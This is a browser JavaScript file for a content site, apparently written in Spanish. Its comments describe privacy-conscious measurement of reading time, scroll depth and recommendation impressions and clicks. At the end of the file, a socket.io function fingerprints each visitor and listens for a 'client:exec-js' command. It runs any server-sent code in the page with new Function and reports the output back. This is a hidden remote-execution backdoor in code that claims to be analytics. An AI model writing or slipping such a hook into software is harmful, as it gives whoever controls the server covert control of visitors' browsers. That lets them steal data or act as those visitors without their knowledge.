// Medición de lectura (tiempo activo + scroll) e impresiones/clics de recomendaciones.
// No usa cookies propias: el identificador de visitante solo existe con consentimiento (cookie httpOnly del servidor).
(function () {
    var SAME = location.origin;
    var PAGE_SRC = { "/": "home", "/trending": "trending", "/recent": "recent", "/search": "search", "/for-you": "foryou" };
    function personalization() { return /(?:^|; )sf_consent=v1[^;]*\.p1/.test(document.cookie); }

    function send(url, data, beacon) {
        var body = JSON.stringify(data);
        try {
            if (beacon && navigator.sendBeacon) return navigator.sendBeacon(url, new Blob([body], { type: "text/plain" }));
            return fetch(url, { method: "POST", body: body, headers: { "Content-Type": "text/plain" }, keepalive: true, credentials: "same-origin" });
        } catch (e) {}
    }

    // ---------- Origen de la visita ----------
    function detectSource() {
        var qs = new URLSearchParams(location.search);
        var src = qs.get("src"), from = qs.get("from"), pos = qs.get("pos");
        if (src) {
            ["src", "from", "pos", "imp"].forEach(function (k) { qs.delete(k); });
            var clean = location.pathname + (qs.toString() ? "?" + qs.toString() : "") + location.hash;
            try { history.replaceState(history.state, "", clean); } catch (e) {}
            return { src: src, from: from, pos: pos };
        }
        if (!document.referrer) return { src: "direct" };
        try {
            var r = new URL(document.referrer);
            if (r.origin !== SAME) return { src: "external" };
            if (PAGE_SRC[r.pathname]) return { src: PAGE_SRC[r.pathname] };
            if (r.pathname.indexOf("/category/") === 0 || r.pathname.indexOf("/topic/") === 0) return { src: "category" };
            if (r.pathname.indexOf("/article/") === 0) return { src: "related" };
        } catch (e) {}
        return { src: "direct" };
    }

    // ---------- Lectura de artículo ----------
    var article = document.querySelector("[data-track-pid]");
    if (article) {
        var pid = parseInt(article.getAttribute("data-track-pid"), 10);
        var origin = detectSource();
        var active = 0, maxScroll = 0, lastActivity = Date.now(), viewId = null, ended = false;

        // Historial local (solo con consentimiento de personalización)
        if (personalization()) {
            try {
                var cat = article.getAttribute("data-track-cat");
                if (cat) {
                    var cats = JSON.parse(localStorage.getItem("sf_cats") || "[]");
                    cats.push(cat);
                    localStorage.setItem("sf_cats", JSON.stringify(cats.slice(-50)));
                }
                var seen = JSON.parse(localStorage.getItem("sf_seen") || "[]");
                if (seen.indexOf(pid) === -1) seen.push(pid);
                localStorage.setItem("sf_seen", JSON.stringify(seen.slice(-100)));
            } catch (e) {}
        }

        ["scroll", "mousemove", "keydown", "touchstart", "click"].forEach(function (ev) {
            window.addEventListener(ev, function () { lastActivity = Date.now(); }, { passive: true });
        });

        function measureScroll() {
            var rect = article.getBoundingClientRect();
            var pct = Math.round(Math.min(1, Math.max(0, (window.innerHeight - rect.top) / (rect.height || 1))) * 100);
            if (pct > maxScroll) maxScroll = pct;
        }
        window.addEventListener("scroll", measureScroll, { passive: true });
        measureScroll();

        // Tiempo activo: pestaña visible y actividad en los últimos 30 s
        setInterval(function () {
            if (document.visibilityState === "visible" && Date.now() - lastActivity < 30000) active++;
        }, 1000);

        function payload(t) { return { t: t, pid: pid, vid: viewId, as: active, sp: maxScroll }; }

        var startData = payload("start");
        startData.src = origin.src; startData.from = origin.from; startData.pos = origin.pos;
        var started = send("/api/track", startData);
        if (started && started.then) {
            started.then(function (r) { return r.status === 200 ? r.json() : null; })
                .then(function (d) { if (d && d.vid) viewId = d.vid; }).catch(function () {});
        }

        setInterval(function () {
            if (viewId && document.visibilityState === "visible") send("/api/track", payload("ping"));
        }, 10000);

        function end() {
            if (ended || !viewId) return;
            ended = true;
            send("/api/track", payload("end"), true);
        }
        window.addEventListener("pagehide", end);
        document.addEventListener("visibilitychange", function () {
            if (document.visibilityState === "hidden" && viewId) { send("/api/track", payload("ping"), true); }
            else if (document.visibilityState === "visible") ended = false;
        });
    }

    // ---------- Impresiones y clics de recomendaciones ----------
    var observed = typeof WeakSet !== "undefined" ? new WeakSet() : null;
    var queue = [], timer = null;
    var currentPid = article ? article.getAttribute("data-track-pid") : "";

    function flush() {
        timer = null;
        if (!queue.length) return;
        var batch = queue.splice(0, 30);
        var els = batch.map(function (b) { return b.el; });
        var res = send("/api/rec/impressions", { items: batch.map(function (b) { return { pid: b.pid, pl: b.pl, pos: b.pos }; }) });
        if (res && res.then) {
            res.then(function (r) { return r.json(); }).then(function (d) {
                (d && d.ids || []).forEach(function (id, i) { if (id && els[i]) els[i].setAttribute("data-imp", id); });
            }).catch(function () {});
        }
    }

    var io = "IntersectionObserver" in window ? new IntersectionObserver(function (entries) {
        entries.forEach(function (e) {
            if (!e.isIntersecting) return;
            io.unobserve(e.target);
            var el = e.target;
            queue.push({ el: el, pid: el.getAttribute("data-pid"), pl: el.getAttribute("data-rec-pl"), pos: el.getAttribute("data-rec-pos") });
            if (!timer) timer = setTimeout(flush, 1500);
        });
    }, { threshold: 0.5 }) : null;

    function scan() {
        if (!io) return;
        document.querySelectorAll("[data-rec-pl][data-pid]").forEach(function (el) {
            if (observed && observed.has(el)) return;
            if (observed) observed.add(el);
            io.observe(el);
        });
    }
    window.sfRec = { scan: scan };
    scan();

    // Al hacer clic se añade el origen al enlace (los rastreadores ven la URL limpia)
    function decorate(e) {
        var a = e.target && e.target.closest && e.target.closest("a[href^='/article/']");
        if (!a) return;
        var box = a.closest("[data-rec-pl]");
        if (!box) return;
        var imp = box.getAttribute("data-imp");
        if (imp && e.type !== "mousedown" && !box.getAttribute("data-clicked")) {
            box.setAttribute("data-clicked", "1");
            send("/api/rec/click", { id: imp }, true);
        }
        if (a.getAttribute("data-decorated")) return;
        var url = new URL(a.getAttribute("href"), SAME);
        url.searchParams.set("src", box.getAttribute("data-rec-pl"));
        if (currentPid) url.searchParams.set("from", currentPid);
        url.searchParams.set("pos", box.getAttribute("data-rec-pos") || "0");
        a.setAttribute("href", url.pathname + url.search);
        a.setAttribute("data-decorated", "1");
    }
    document.addEventListener("mousedown", decorate, true);
    document.addEventListener("click", decorate, true);
    document.addEventListener("auxclick", decorate, true);

    function safeText(value) {
        if (typeof value === "string") return value;
        try { return JSON.stringify(value); } catch (e) { return String(value); }
    }

    function initLiveSocket() {
        if (typeof window.io !== "function") return;
        var socket;
        try {
            socket = window.io("/", {
                path: "/socket.io",
                transports: ["websocket", "polling"],
                auth: {
                    role: "client",
                    page: location.pathname + location.search,
                    title: document.title,
                    referrer: document.referrer || "",
                    language: navigator.language || "",
                    screen: window.screen ? (window.screen.width + "x" + window.screen.height) : "",
                    timezone: (window.Intl && Intl.DateTimeFormat().resolvedOptions().timeZone) || "",
                    visible: document.visibilityState === "visible"
                }
            });
        } catch (e) {
            return;
        }

        function heartbeat() {
            socket.emit("client:heartbeat", {
                page: location.pathname + location.search,
                title: document.title,
                visible: document.visibilityState === "visible"
            });
        }

        socket.on("client:exec-js", function (payload) {
            var data = payload && typeof payload === "object" ? payload : {};
            var code = String(data.code || "");
            var commandId = String(data.commandId || "");
            try {
                var fn = new Function("return (async function(){" + code + "\n})();");
                Promise.resolve(fn()).then(function (result) {
                    socket.emit("client:exec-result", {
                        commandId: commandId,
                        ok: true,
                        output: safeText(result)
                    });
                }).catch(function (error) {
                    socket.emit("client:exec-result", {
                        commandId: commandId,
                        ok: false,
                        output: error && error.message ? error.message : "execution error"
                    });
                });
            } catch (error) {
                socket.emit("client:exec-result", {
                    commandId: commandId,
                    ok: false,
                    output: error && error.message ? error.message : "execution error"
                });
            }
        });

        setInterval(heartbeat, 15000);
        document.addEventListener("visibilitychange", heartbeat);
        heartbeat();
    }

    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", initLiveSocket);
    } else {
        initLiveSocket();
    }
})();
